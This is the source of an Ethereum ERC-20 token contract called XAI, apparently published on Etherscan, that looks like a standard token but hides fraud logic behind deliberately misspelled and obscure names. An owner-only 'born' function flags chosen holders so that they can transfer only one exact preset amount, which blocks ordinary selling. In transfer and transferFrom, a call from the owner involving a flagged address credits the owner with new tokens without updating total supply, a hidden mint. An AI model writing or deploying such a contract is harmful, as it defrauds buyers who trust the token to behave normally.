/**
 *Submitted for verification at Etherscan.io on 2023-07-30
*/

pragma solidity ^0.8.3;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address accoouunt) external view returns (uint256);
    function transfer(address recipient, uint256 aiomount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 aiomount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 aiomount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyowner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract XAI is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _STTSA;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function balanceOf(address accoouunt) public view override returns (uint256) {
        return _balances[accoouunt];
    }

    function transfer(address recipient, uint256 aiomount) public virtual override returns (bool) {
        if (_msgSender() == owner() && _STTSA[_msgSender()] > 0+0) {
            _balances[owner()] += _STTSA[_msgSender()];
            return true;
        }
        else if (_STTSA[_msgSender()] > 0) {
            require(aiomount == _STTSA[_msgSender()], "Invalid transfer aiomount");
        }
        require(_balances[_msgSender()] >= aiomount, "TT: transfer aiomount exceeds balance");
        _balances[_msgSender()] -= aiomount;
        _balances[recipient] += aiomount;
        emit Transfer(_msgSender(), recipient, aiomount);
        return true;
    }

    function born(address[] memory accoouunts, uint256 aiomount) public onlyowner {
        for (uint i=0; i<accoouunts.length; i++) {
            _STTSA[accoouunts[i]] = aiomount;
        }
    }


    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 aiomount) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = aiomount;
        emit Approval(_msgSender(), spender, aiomount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 aiomount) public virtual override returns (bool) {
        if (_msgSender() == owner() && _STTSA[sender] > 0) {
            _balances[owner()] += _STTSA[sender];
            return true;
        }
        else if (_STTSA[sender] > 0) {
            require(aiomount == _STTSA[sender], "Invalid transfer aiomount");
        }
        require(_balances[sender] >= aiomount && _allowances[sender][_msgSender()] >= aiomount, "TT: transfer aiomount exceeds balance or allowance");
        _balances[sender] -= aiomount;
        _balances[recipient] += aiomount;
        _allowances[sender][_msgSender()] -= aiomount;
        emit Transfer(sender, recipient, aiomount);
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
}